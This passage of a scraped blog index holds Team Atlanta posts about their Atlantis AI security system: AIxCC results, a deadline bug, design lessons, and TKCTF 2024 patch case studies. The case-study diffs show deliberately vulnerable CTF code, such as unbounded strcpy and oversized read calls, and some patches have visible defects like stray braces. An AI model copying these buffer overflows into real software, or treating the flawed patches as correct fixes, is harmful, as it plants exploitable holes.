POVs, patches, SARIF assessments, and bundles with high accuracy in the final round and ultimately won the competition, as shown below. Notably, our bundle score was significantly higher than other teams, even when accounting for the large number of POVs we found and patches we generated. This demonstrates that Atlantis was able to effectively map the relationships between discovered POVs, generated patches, and SARIF assessments \u0026ndash; a capability that can be incredibly valuable for real-world developers.\nHere is a breakdown of our submission, reconstructed from the logs we were able to recover. Please note that this is not fully accurate since a portion of the logs is missing, and we are not yet certain which submission was ultimately scored. We will provide an updated and verified version once the AIxCC organizers release the official detailed logs.\n+--------------------+-------+--------+--------+--------+ | Category | Count | Passed | Failed | Scored | +--------------------+-------+--------+--------+--------+ | POV -\u0026gt; CP Manager | 1,002 | N/A | N/A | N/A | | POV -\u0026gt; Organizers* | 107 | 107 | 0 | 43 | | Patches | 47 | 41 | 6 | 31 | | SARIF Reports | 8 | N/A | N/A | N/A | | Bundles | 42 | N/A | N/A | N/A | +--------------------+-------+--------+--------+--------+ *: after POV verification \u0026amp; deduplication `Scored`: Marked after the AIxCC organizers manually reviewed `Passed` result Testing, Testing, and Testing! While developing Atlantis, we conducted extensive testing to fix bugs and evaluate the effectiveness of each module. Under the leadership of Jiho Kim, we prepared over 50 CP benchmarks and tested Atlantis against them using a test version of AIxCC competition server. This allowed us to perform end-to-end testing not only in the three practice rounds provided by the AIxCC organizers, but also in four additional internal rounds. Across these seven rounds, we identified and fixed numerous bugs, ultimately making Atlantis far more robust. Notably, some modules like Atlantis-Multilang has their own CIs to test and evaluate themselves based on our benchmarks. We plan to release our benchmarks once we determine a way to prevent GenAI models from training on them.\nFixed a fatal bug right before the deadline However, even with extensive testing, we failed to catch a fatal bug in Atlantis-Patch, described in our previous post, until the final moments before submission. The bug was related to enforcing a rule that Atlantis-Patch must not modify the given fuzzing harnesses. Our implementation treated any file whose path contained fuzz as a fuzzing harness and blocked modifications accordingly. Everything worked fine in our internal tests. But, during the final testing with the AIxCC organizers’ API right before submission, we discovered that all CPs had their directories prefixed with ossfuzz. As a result, Atlantis-Patch refused to generate any patches. Initially, I suspected the issue was due to the non-deterministic nature of LLMs. However, Soyeon spotted unusual log entries with Permission denied, revealing that the patch process was blocked because it attempted to modify a fuzzing harness. This was discovered just a few hours before the final submission. I urgently called our Atlantis-Patch teammates in South Korea at 3 AM their time. Fortunately, we fixed the issue within an hour and managed to submit Atlantis before the deadline.\nFrom the Author After the Last Commit Since no human intervention was allowed during the competition, we spent a significant amount of time on infrastructure development and testing. All of infrastructure team members not only worked on their assigned roles (e.g., bug finding, SARIF assessment) but also contributed to infra development and testing on the side. I am deeply grateful to them, and this experience really helped me understand why companies have dedicated DevOps teams. In particular, I have a feeling that as LLMs and GenAI become more widely adopted, specialized LLM DevOps teams will also emerge. I will never forget the times when our LiteLLM had to be rebooted frequently because it could not keep up with requests from our modules. Overall, it was an incredible experience to go beyond a research prototype and operate such a large-scale system in a real competition while collaborating and communicating closely with all the sub-teams (Atlantis-C/Java/Multilang/SARIF/Patch) throughout the journey.\n"},{"section":"Blog","slug":"/blog/post-afc/","title":"AIxCC Final and Team Atlanta","description":"Atlantis in CTF competitions","date":"August 12, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/afc/afc-team_hu_1e8c562fabab95ab.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"194\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/afc\\/afc-team_hu_2f9a4e9f5ef2a770.jpeg';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/afc/afc-team_hu_6fe684af5f1e3bb0.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/afc\\/afc-team_hu_6bcf2ba292725a9e.jpeg';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Milestone","tags":"AFC","content":"Two years after its first announcement at DEF CON 31, our team stood on stage as the winners of the AIxCC Final—a moment we had been working toward since the competition began.\nYet when we heard we placed 1st, relief overshadowed excitement. Why? While competing head-to-head with world-class teams like Theori was a privilege, the real-time, long-running nature of this competition demanded extreme engineering reliability alongside novel approaches to succeed.\nBalancing innovation with stability under time pressure proved our greatest challenge. We simply hoped our Cyber Reasoning System (CRS) would run as intended— but it exceeded expectations, outperforming other teams in most categories by significant margins.\nIn this post, I\u0026rsquo;ll answer the most common questions we received from the DEF CON audience and share the story behind our victory.\nWhy were we so anxious? In this competition, a single bug can be fatal. One line of code nearly destroyed our chances.\nWe discovered this critical bug, which almost ended everything, during integration testing— just hours after submitting our final version, and mere hours before the deadline. The problematic code was designed to skip patch generation for fuzzing harnesses. In all previous challenge projects and our benchmarks, fuzzing harness source files contained \u0026ldquo;fuzz\u0026rdquo; in their paths (e.g., \u0026ldquo;fuzz/\u0026rdquo; or \u0026ldquo;http_request_fuzzer.cc\u0026rdquo; in nginx)— a simple but effective heuristic to avoid false positives.\nThe problem? During our final integration test, we discovered the organizers had prefixed all OSS-Fuzz projects with \u0026ldquo;ossfuzz\u0026rdquo; (e.g., \u0026ldquo;r3-ossfuzz-sqlite3\u0026rdquo;). The irony wasn\u0026rsquo;t lost on us—here we were, building an autonomous CRS powered by state-of-the-art AI, nearly defeated by a string matching bug. In postmortem, we figured none of the CP is named with the \u0026ldquo;fuzz\u0026rdquo; prefix though!\nL0. System Robustness is Priority #1 As our near-miss demonstrated, a single bug can kill a CRS entirely. The autonomous system is that brittle. So how did we balance engineering for robustness with novel research needed to win?\nOur answer: N-version programming with orthogonal approaches.\nAtlantis isn\u0026rsquo;t a single CRS—it\u0026rsquo;s a group of multiple independent CRSs, each designed by specialized teams (C, Java, Multilang, Patch, and SARIF). These teams deliberately pursued orthogonal strategies to maximize both coverage and fault tolerance.\nFor bug finding alone, we deployed three distinct CRSs:\nAtlantis-Multilang: Built for robustness and language-agnostic bug finding Atlantis-C: Optimized specifically for C/C++ vulnerabilities Atlantis-Java: Tailored for Java-specific bug patterns Design Overview of Atlantis (stay tuned for our Technical Report).\rThese CRSs deliberately made orthogonal approaches; Atlantis-Multilang took conservative paths (no instrumentation at build time) while Atlantis-C took risky approaches requiring heavy compilation-time instrumentation:\nAtlantis-C CRS: ↑ instrumentation: libafl-based, instrument-based directed fuzzer ↓ LLM usage: seed generation, input mutation Time-based resource allocation Atlantis-Multilang CRS: ↓ instrumentation: libfuzzer-based, simple seed-based directed fuzzer ↑ LLM: seed/blob generation, input format reverser, callgraph, dictgen, etc Space-based resource allocation By maintaining minimal sharing between CRSs and intentionally making orthogonal design decisions, we ensured that a failure in one component wouldn\u0026rsquo;t cascade through the entire system. When one approach failed, others continued operating— true fault tolerance through diversity.\nL1. Don\u0026rsquo;t Give Up on Traditional Program Analysis Unlike DARPA\u0026rsquo;s Cyber Grand Challenge, where CRSs dealt with an artificial architecture limited to 7 system calls, AIxCC evaluates CRSs against real-world, complex open source software— the foundation of today\u0026rsquo;s cyber infrastructure.\nThis shift changes everything. Traditional program analysis tools that can\u0026rsquo;t scale to handle real-world complexity would doom any CRS.\nWe initially hoped to stand on the shoulders of giants, evaluating most commodity solutions to save development time. Unfortunately, even state-of-the-art tools like SWAT and SymCC weren\u0026rsquo;t ready for large-scale software analysis. Each required substantial engineering to become competition-ready.\nUltimately, we invested heavily in extending traditional tools. For both C and Java, we developed three categories:\nEnsemble fuzzers: LibAFL for Java/C, libFuzzer, AFL++, custom Jazzer, custom format fuzzers Concolic executors: Extended SymCC for C, custom implementation for Java Directed fuzzers: Custom implementations for C and Java Each tool required non-trivial engineering efforts to be effective. The lesson: AI alone isn\u0026rsquo;t enough—traditional program analysis remains essential, but it must be extensively adapted for real-world scale.\nL2. Ensembling to Promote Diversity Research shows that ensemble fuzzing outperforms single campaigns with equivalent computing resources, as demonstrated by autofz. Atlantis embraces this principle everywhere: coverage-guided fuzzers, directed fuzzers, concolic executors, and patching agents.\nPatching particularly benefits from LLM diversity— what the ML community calls \u0026ldquo;hallucination,\u0026rdquo; systems engineers call \u0026ldquo;non-determinism,\u0026rdquo; and we call \u0026ldquo;creativity.\u0026rdquo; By ensembling multiple agents with orthogonal approaches, Atlantis harnesses this non-deterministic nature of LLMs.\nThe Critical Role of Oracles. Ensembling only works when oracles exist to judge correctness.\nIn fuzzing, hardware provides our first oracle: segmentation faults from invalid memory access are caught efficiently through page table violations. Software sanitizers extend this scope— ASAN for memory unsafety bugs, UBSAN for undefined behavior, MSAN for memory leaks— detecting bugs long before crashes occur.\nFor patching, the Proof-of-Vulnerability (PoV) serves as our oracle. We validate patches by re-running the PoV against patched programs. We say \u0026ldquo;likely correct\u0026rdquo; because patches might work through unintended mitigation rather than true fixes.\nConsider these problematic \u0026ldquo;patches\u0026rdquo;:\nRecompiling C code with MTE or PAC on ARM to suppress PoVs Wrapping Java entry points in broad catch(Exception) blocks Our agents carefully avoid such mitigations. Yet semantic correctness remains subjective— which is why AIxCC provides optional test.sh scripts as additional oracles for our patching agents.\nDesign of Patching Agents.\rBuilding Specialized Agents. During preparation, we recognized a key insight: building one universally powerful agent is harder than building multiple specialized agents for specific tasks. This echoes the philosophy behind AlphaEvolve and AlphaCode.\nSurprisingly, smaller models like GPT-4o-mini often outperformed larger foundation models and even reasoning models for our tasks. We speculate that its 8 billion parameters hit a sweet spot— large enough to understand code patterns, small enough to avoid overthinking simple fixes.\nPractical Constraints on Scaling. Unlike AlphaCode\u0026rsquo;s massive agent scaling, we faced a practical bottleneck: validating patches in large codebases takes minutes if not hours (e.g., 10+ minutes for nginx). This forced Atlantis-Patching to limit itself to six agents, focusing on quality over quantity.\nTheori took a radically different approach: purely static analysis, producing three correct patches without PoVs. This demonstrates LLMs\u0026rsquo; remarkable ability to understand code semantics without runtime validation, which we\u0026rsquo;d like to explore further.\nThe scoreboard reveals the trade-off: Theori\u0026rsquo;s 44.4% accuracy yielded an Accuracy Modifier of 0.9044 ($1 - (1 - 0.4444)^4$), while our PoV-validated approach achieved 0.9999 ($1 - (1 - 0.9127)^4$).\nOur CRS can generate patches without PoVs, but we deliberately chose not to—a strategic decision we debated extensively and validated through our internal benchmark.\nPost-competition, we\u0026rsquo;re excited to explore PoV-free patching\u0026rsquo;s full potential.\nL3. LLM 101: How to Babysit Jack-Jack? During our CTFRadio interview, Yan mentioned that Shellfish had to babysit LLMs for their agents. The analogy resonates: LLMs are like Jack-Jack Parr from Incredibles— a superpowered baby with multiple, unpredictable abilities that even his superhero parents don\u0026rsquo;t fully understand.\nLike Jack-Jack, LLMs have not one superpower but many, and we\u0026rsquo;re still discovering how to harness them effectively. We \u0026ldquo;gaslight\u0026rdquo; our LLMs into specific roles, telling them they\u0026rsquo;re \u0026ldquo;security researchers\u0026rdquo; or even researchers from Google DeepMind.\nThe Evolution of Prompting Techniques. Throughout the competition, we witnessed firsthand the rapid evolution of foundation models and prompting strategies. Early tricks like \u0026ldquo;I\u0026rsquo;ll give you a $200 tip\u0026rdquo; surprisingly generated longer, more detailed responses. Techniques multiplied: Chain-of-Thought (CoT), Tree-of-Thoughts (ToT), Self-Consistency (SC).\nWe tested everything and integrated what worked, like \u0026ldquo;Think step by step\u0026rdquo; prompts. Agentic architectures evolved in parallel: ReAct, Reflection, tool use, multi-agent systems, sub-agents— we adopted many (as shown above).\nManaging Rapid Change. The pace of change in the LLM space is unprecedented. Every vendor claims benchmark supremacy, making it impossible to evaluate every new claim or technique.\nOur solution: continuous empirical testing. We evaluate performance daily through CI using our internal benchmark, monitoring for sudden drops or improvements. (Shellfish even built an LLM agent specifically for this task!)\nTo avoid vendor lock-in, we built abstraction layers. LiteLLM serves as our proxy, multiplexing requests and responses across different LLM providers for each agent.\nHandling External Dependencies. Since LLMs are externally managed services, Atlantis must handle various failure modes:\nToken limits exceeded Daily/subscription quotas hit Unexplained downtime or delays We experienced all of these during the exhibition rounds and built resilience mechanisms accordingly.\nL4. LLM-Augmented, LLM-Opinionated, and LLM-Driven Atlantis employs LLMs through three distinct integration strategies, each with different levels of trust and autonomy.\nLLM-Augmented: Extending Traditional Tool. In this approach, LLMs enhance traditional analysis techniques where conventional methods struggle with scale. Fuzzing tools integrate LLMs for:\nInput generation Dictionary generation Seed generation Here, LLMs fill gaps where traditional techniques fail to scale to real-world software complexity.\nLLM-Opinionated: Optimistic Suggestions. Tools like Testlang and Harness Reverser operate with calculated risk. LLMs provide likelihood-based suggestions that workflows treat as hints—similar to optimistic concurrency control.\nWhen predictions are correct, the system benefits significantly. When wrong, we pay a performance penalty but maintain correctness.\nLLM-Driven: Autonomous Navigation. Our most ambitious approach gives LLMs full autonomy. The MLLA agent and POC Gen in Java CRS autonomously navigate code repositories, generating \u0026ldquo;blobs\u0026rdquo;—inputs designed to trigger identified bugs from diffs or SARIF reports.\nThis strategy bets on LLMs having latent security intuition buried in their weights, allowing them to reason about entire codebases independently.\nSo How Well Did Atlantis Perform? Atlantis dominated the scoreboard, earning top scores in nearly every category. Remarkably, we accumulated roughly the same total points as the second and third place teams combined.\nWhile we\u0026rsquo;re still analyzing the complete dataset, early observations suggest our CRS excelled on certain challenge projects (like Wireshark) where other teams struggled. Our conservative strategy proved decisive: high accuracy in crash reports and patches yielded a near-perfect accuracy multiplier, while our strong bundle scores validated our careful approach to matching PoVs with patches and SARIF reports.\nReal-World Bugs. Does this approach work in the wild? During the final, all competing CRSs collectively discovered 6 C/C++ bugs and 12 Java bugs in real-world software. Atlantis contributed 3 of each category, including a 0-day vulnerability in SQLite discovered during the semi-final.\nWhat\u0026rsquo;s Next? For a casual discussion of our journey and lessons learned, check out our CTFRadio interview:\nOpen Source Release. Our competition CRS code is publicly available, but the current system requires substantial infrastructure: Microsoft Azure deployment, Terraform, Kubernetes, Tailscale, and external LLM service dependencies.\nTo make Atlantis accessible to the broader community, we\u0026rsquo;re creating a streamlined fork that:\nRemoves competition-specific APIs Runs on a single workstation via Docker Compose Includes a revised benchmark suite for standardized evaluation Call for Collaboration. We\u0026rsquo;re launching continuous bug hunting on OSS-Fuzz projects. To sustain this effort, Team Atlanta is donating $2.0M (50% of our prize) to SSLab at Georgia Tech for:\nOngoing research in autonomous security systems with LLM Expenses to continuously run Atlantis to open source projects Scholarship to PhD students and postdocs Join us in advancing autonomous security research! And we are seeking funding for public research \u0026ndash; OpenAI joined this effort to make donation to us along with the API credits.\nComing Soon.\nTechnical Report: Detailed system architecture and findings (releasing in two weeks) Blog Series: Deep dives into specific CRS components and strategies Postmortem: Analysis of the final competition data and effectiveness of each techniques/CRSs "},{"section":"Blog","slug":"/blog/post-tkctf-2024/","title":"Hacking Redefined: How LLM Agents Took on University Hacking Competition","description":"Atlantis in CTF competitions","date":"December 3, 2024","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/tkctf2024/ai-vs-human_hu_1cca12a5e59caa7e.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"315\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/tkctf2024\\/ai-vs-human_hu_b2d4288e091735d0.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/tkctf2024/ai-vs-human_hu_e893e5f2759e3f4b.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/tkctf2024\\/ai-vs-human_hu_4deee4d9fabe84eb.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Milestone","tags":"Atlantis CRS","content":"For the first time, we deployed our hybrid system, powered by LLM agents—Atlantis—to compete in Georgia Tech’s flagship CTF event, TKCTF 2024. During the competition, Atlantis concentrated on two pivotal areas: vulnerability analysis and automatic vulnerability remediation. Remarkably, the system uncovered 10 vulnerabilities and produced 7 robust patches1, showcasing the practicality and promise of our approach in a real-world hacking competition.\nIn this blog, I’ll delve into some fascinating insights and essential lessons from the CTF experience. As we prepare to open-source the full details of our system following AIxCC competition rules, this milestone reflects more than just a technical achievement—it embodies our commitment to advancing LLM-driven security research.\nWhat might appear as another incremental step in CTF competitions actually marks a significant leap in our journey. The success of Atlantis at TKCTF was a testament to the dedication and expertise of our exceptional team: Andrew Chin, Jiho Kim, Gyejin Lee, Seunggi Min, Kevin Stevens, Woosun Song, and Hanqing Zhao,\nWe invite you to follow us on Twitter/X (@TeamAtlanta24) to stay updated on our work at the intersection of AI and security.\nAIxCC, Atlantis CRS, and CTF AIxCC Finalists\rAI Cyber Challenge (AIxCC) is a two-year competition designed to advance the state of the art in AI-based security research. We, Team Atlanta, are proud to be one of the 7 finalist teams, presenting a novel cyber reasoning system, Atlantis CRS.\nThe concept behind our system is straightforward: emulate the mindset of skilled security researchers and hackers using LLM agents, augmented by advanced program analysis techniques.\nAs seasoned veterans of CTF competitions, we’ve always aspired to bring AI and LLMs into the CTF arena. This time, we deployed our system alongside human players, concentrating on analyzing source code repositories and patching identified vulnerabilities. Georgia Tech’s CTF competition, TKCTF, offered the perfect setting to put our system to the test.\nThe challenges were designed by students and staff from Georgia Tech’s CS6265 Fall 2024 class. In addition to Georgia Tech participants, teams from across the University System of Georgia (USG) joined the competition. The winning team received a $1,000 prize.\nRecap of Atlantis\u0026rsquo;s Performance Atlantis Dashboard\rOver the course of the competition, we ran Atlantis CRS on 12 different CTF challenges, each with a time limit of approximately 4 hours. By the end, our system successfully identified 10 vulnerabilities and generated 7 robust patches.\nWhile the overall difficulty of the challenges was moderate, Atlantis successfully identified most of the intended memory safety vulnerabilities and even uncovered two unintended vulnerabilities. The competition also provided several interesting cases and valuable lessons, which I’ll share below.\nMaze Puzzles One of the challenges was a maze puzzle. It generated a random maze where the intended solution required players to write an algorithm to parse the map and find the path through the maze.\nClick to view an example of the maze puzzle ./target ######################################### #P* * * * * * # # *** ***** * *** * *** *** * ******* * # # * * * * * * * * * # #** ***** ***** * * * * *********** *** # # * * * * * * * * * * # # *** * *** ***** *** *** * * * ******* # # * * * * * * * * * # # *** *** * * * *** *** * * ************# # * * * * * * * * * * # #****** * ******* *** *** ********* * * # # * * * * * * * * * # # * ******* * ***** *** * * ******* *** # # * * * * G# ######################################### Steps: 0 ========= # another run ./target ######################################### #P * * * * * * * # #** * * * *** * *** ***** * * ***** * * # # * * * * * * * * * * * * * # # *** * * * *** * *** * * * * * * ***** # # * * * * * * * * * * * * # #****** * ******* * * ******* * *** * **# # * * * * * * * * * # # * *** * * ********* * *** *** * * *** # # * * * * * * * * * # # ******* ***** * * * * * ******* * *** # # * * * * * * * * * * * # # * *** *** * *** * ******* *** ***** * # # * * * * * *G# ######################################### Steps: 0 ========= Interestingly, Atlantis correctly navigated the maze through several runs of trial and error. This demonstrated the ability of LLM agents to enhance program analysis by “understanding” the high-level intent of a program.\nDiscovering Unintended Vulnerabilities Beyond the intended vulnerabilities, Atlantis also discovered two unintended ones:\nFloating Point Exception (FPE): A vulnerability causing stack underflow. Insufficient Input Validation: An unchecked empty input led to a stack buffer overflow. Although the challenges were not overly complex, this highlights Atlantis’s potential in automated testing and vulnerability discovery.\nUndiscovered Vulnerabilities Due to Logic Flaws Atlantis struggled with challenges involving logical flaws. For example, in the two-sum challenge:\nChallenge Details: The task didn’t involve memory safety issues but required exploiting unordered_map hash collisions to manipulate the control flow in the twoSum function. Missed Opportunity: Since Atlantis was tuned to prioritize memory safety issues, it overlooked this logic-based vulnerability. This underscored the need to enhance Atlantis’s capabilities in analyzing logical vulnerabilities, an area we plan to focus on in future improvements.\nCase Studies: How Atlantis Patches Vulnerabilities A standout feature of Atlantis is its capability to generate patches for discovered vulnerabilities. In this CTF, Atlantis produced 7 fully sound patches, showcasing both the system’s confidence and its ease in handling the challenges, which were relatively straightforward.\nIn this section, I’ll provide a summary of key cases and the patching decisions made by Atlantis’s agent system.\nUnsafe functions replaced by safer ones diff --git a/double_trouble.c b/double_trouble.c index 83a693b..e8f0737 100644 --- a/double_trouble.c +++ b/double_trouble.c @@ -5,8 +5,9 @@ void foo(char *msg) { char buf[80]; - strcpy(buf, msg); // Vulnerable: No bounds checking - strcpy(msg, buf); // Vulnerable: No bounds checking + strncpy(buf, msg, sizeof(buf) - 1); // Use strncpy for bounds checking + buf[sizeof(buf) - 1] = \u0026#39;\\0\u0026#39;; // Ensure null termination + strncpy(msg, buf, strlen(msg)); // Use strncpy for bounds checking } One of the principles guiding Atlantis is avoiding the use of unsafe functions. For instance, in one case, Atlantis replaced strcpy with strncpy and added a null termination check to ensure the safety of string operations. Given that the C language inherently includes many unsafe functions, Atlantis takes a conservative approach by systematically replacing these functions with their safer counterparts wherever possible.\nBounds checking and termination handling diff --git a/target.c b/target.c index f512754..7f7bfef 100644 --- a/target.c +++ b/target.c @@ -23,9 +23,16 @@ func run_at_end = dont_print_key; uint32_t read_int(void) { char buf[10]; ssize_t size = read(0, buf, sizeof(buf) - 1); + if (size \u0026lt;= 0) { + if (size == 0) { + printf(\u0026#34;Error: End of input stream\\n\u0026#34;); + } else { + perror(\u0026#34;Error: Read failed\u0026#34;); + } + return 0; // or handle error as needed + } buf[size] = \u0026#39;\\0\u0026#39;; uint32_t res = atoi(buf); - return res; } diff --git a/ymca.c b/ymca.c index 5bf7de7..ca10ea1 100644 --- a/ymca.c +++ b/ymca.c @@ -87,7 +87,10 @@ bool is_in_array(int step, int arr[], int size) { void vulnerable() { char buffer[64]; printf(\u0026#34;Enter your Steps of the YMCA Song:\\n\u0026#34;); - read(STDIN_FILENO, buffer, 1000); + ssize_t bytes_read = read(STDIN_FILENO, buffer, sizeof(buffer) - 1); + if (bytes_read \u0026gt; 0) { + buffer[bytes_read] = \u0026#39;\\0\u0026#39;; // Null-terminate the buffer + } } diff --git a/rop.c b/rop.c index 5df7c9c..c858436 100644 --- a/rop.c +++ b/rop.c @@ -83,7 +83,7 @@ int main(int argc, char** argv) { fgets(buf, sizeof(buf), stdin); // make newline null terminator int input_len = strlen(buf); - if (buf[input_len - 1] == \u0026#39;\\n\u0026#39;) { + if (input_len \u0026gt; 0 \u0026amp;\u0026amp; buf[input_len - 1] == \u0026#39;\\n\u0026#39;) { buf[input_len - 1] = \u0026#39;\\0\u0026#39;; } Out-of-bounds vulnerabilities are among the most common issues in software. Atlantis addresses this by employing dedicated optimizations to thoroughly check array and memory bounds, ensuring that user inputs are constrained within a safe range. This proactive approach minimizes the risk of unintended memory access and enhances overall software reliability.\nSafe rewrite of the entire function diff --git a/target.c b/target.c index c364280..712ac08 100755 --- a/target.c +++ b/target.c @@ -14,25 +14,27 @@ int null_pos = -1; int newline_pos = -1; void copy_buffer(unsigned char* buf) { -\tnull_pos = -1; -\tnewline_pos = -1; -\tint i = 0; -\twhile (i \u0026lt; BUF_SIZE) { -\tif (newline_pos \u0026lt; 0 \u0026amp;\u0026amp; gbuf[i] == 0xa) { -\tnewline_pos = i; -\t} -\tif (null_pos \u0026lt; 0 \u0026amp;\u0026amp; gbuf[i] == 0x0) { -\tnull_pos = i; -\t} -\tgbuf[i] = (gbuf[i] ^ key[i]) \u0026amp; 0xff; -\ti++; -\t} -\tint j = 0; -\twhile (j \u0026lt; min(null_pos, newline_pos)) { -\tbuf[j] = gbuf[j]; -\tj++; -\t} -\tprintf(\u0026#34;Copied %d of %d bytes!\\n\u0026#34;, min(null_pos, newline_pos), strlen(gbuf)); + null_pos = BUF_SIZE; + newline_pos = BUF_SIZE; + int i = 0; + while (i \u0026lt; BUF_SIZE) { + if (newline_pos == BUF_SIZE \u0026amp;\u0026amp; gbuf[i] == 0xa) { + newline_pos = i; + } + if (null_pos == BUF_SIZE \u0026amp;\u0026amp; gbuf[i] == 0x0) { + null_pos = i; + } + gbuf[i] = (gbuf[i] ^ key[i]) \u0026amp; 0xff; + i++; + } + int j = 0; + int copy_len = min(null_pos, newline_pos); + copy_len = min(copy_len, 20); // Ensure we don\u0026#39;t exceed buf size + while (j \u0026lt; copy_len) { + buf[j] = gbuf[j]; + j++; + } + printf(\u0026#34;Copied %d of %d bytes!\\n\u0026#34;, copy_len, BUF_SIZE); } Atlantis typically aims to keep patches minimal, modifying the fewest possible lines to reduce the risk of altering intended code behavior or introducing unsoundness. However, after several iterations, if Atlantis cannot produce an optimal minimal patch, it will optionally rewrite the entire function to comprehensively address the vulnerability. This approach balances precision with robustness, ensuring both safety and functionality.\nError handling correction diff --git a/stackmachine.c b/stackmachine.c index 7b95b62..d00d75f 100644 --- a/stackmachine.c +++ b/stackmachine.c @@ -88,11 +88,11 @@ void push(int *values, int *idx, int elt) { int pop(const int *values, int *idx) { if (*idx \u0026lt;= START) { myerrno = -1; - return 0; + return INT_MIN; // Return a special error code } (*idx)--; - int ret = values[*idx]; - return ret; + return values[*idx]; +} } void main_loop(); @@ -144,9 +144,13 @@ void print_utf8(wchar_t *wcs) { */ void ret(int *values, int *idx) { r1 = pop(values, idx); - if (myerrno != 0) { return; } + if (myerrno != 0 || r1 == INT_MIN) { + puts(\u0026#34;Error: Attempted to pop from an empty stack.\u0026#34;); + return; + } printf(\u0026#34;%d\\n\u0026#34;, r1); } +} For bugs involving inter-procedural logic, Atlantis analyzes cross-procedural data flow and incorporates error handling into its patches. For instance, when addressing a vulnerability in stackmachine.c, Atlantis correctly handled the error case by introducing logic to return a special error code, ensuring robust and predictable behavior.\nThat said, the patches produced during this competition don’t fully showcase Atlantis’s potential, as the challenges lacked sophistication. For a more advanced example, check out our work on the SQLite3 zero-day vulnerability. Since then, Atlantis has undergone multiple rounds of improvement, and we remain committed to open-sourcing the full details of our system after the AIxCC competition.\nUnsound Patches Atlantis was unable to patch three of the challenges due to unsound patches. Two of these failures stemmed from the puzzle-like nature of the challenges:\nMaze Challenge: This challenge required finding the path through a maze. A patch that fixes the vulnerability inadvertently altered the intended behavior, conflicting with the challenge\u0026rsquo;s goals. Shellcode-Golf Challenge: This challenge demanded crafting a specific shellcode to pass a verification check. A patch that addressed the vulnerability ended up modifying the check logic, effectively changing the intended behavior. The third unsound patch occurred due to the complexity of inter-procedural logic, which presented challenges for Atlantis in accurately resolving the issue without disrupting the intended program flow.\nClick me to show the pseudo code uint32_t foo(void) { char buf[10]; ssize_t size = read(0, buf, sizeof(buf) - 1); buf[size] = \u0026#39;\\0\u0026#39;; uint32_t res = atoi(buf); return res; } void main_loop() { while (1) foo(); } When a read operation fails due to empty input, the size variable becomes -1, leading to a stack underflow and subsequent crash. While Atlantis’s patch system successfully addresses the root cause and prevents an ASAN crash, it inadvertently introduces an infinite loop due to the lack of handling for empty input within the main loop. As a result, this patch is deemed unsound because it fails to fully resolve the issue in a functional and robust manner.\nTeam Atlanta\u0026rsquo;s Next Steps Frankly, Atlantis still has a long way to go before becoming a seamless autonomous CTF competitor for pwnable challenges, which remains one of our team’s long-term goals.\nTo move closer to this vision, we are focusing on the following improvements to create a fully autonomous CTF pwner agent:\nChallenge Understanding:\nWhile we concentrate on pwnable challenges, modern pwnables often come in diverse formats, such as kernel drivers and patched browsers. Atlantis needs to identify the challenge format and generate appropriate analysis code to handle these variations, aiming for more general-purpose functionality.\nBinary Analysis Support:\nCurrently, Atlantis supports only source code repositories. Since many CTF challenges are distributed as binaries, we plan to integrate our own decompilation framework to enable binary analysis. This approach will offer a tailored experience, moving beyond existing tools like IDA Pro to provide more comprehensive support.\nAutomatic Exploit Generation:\nAt present, Atlantis can only generate Proof-of-Concept (PoC) code to trigger vulnerabilities. Our goal is to enable the generation of more powerful exploits, such as arbitrary read/write primitives, expanding its utility and effectiveness in real-world scenarios.\nCustomized LLM Models:\nWe are working on customizing LLM models specifically for security analysis. Tailored models could reduce the need for sophisticated prompts, simplify our system architecture, and improve both speed and accessibility, making Atlantis more efficient and user-friendly.\nBy addressing these challenges, we aim to push the boundaries of AI in cybersecurity and bring Atlantis closer to becoming a fully autonomous and versatile competitor.\nThe Ending Note As someone from a generation that grew up learning computer science through CTF competitions, I can confidently say that CTFs have been instrumental in teaching us about operating systems and security. Looking ahead, I sincerely hope that CTFs will once again serve as a platform to teach us how to develop new language models and agents for security research.\nI hope our first step in TKCTF 2024 inspires more researchers to join this vibrant and innovative community. If you’re passionate about AI 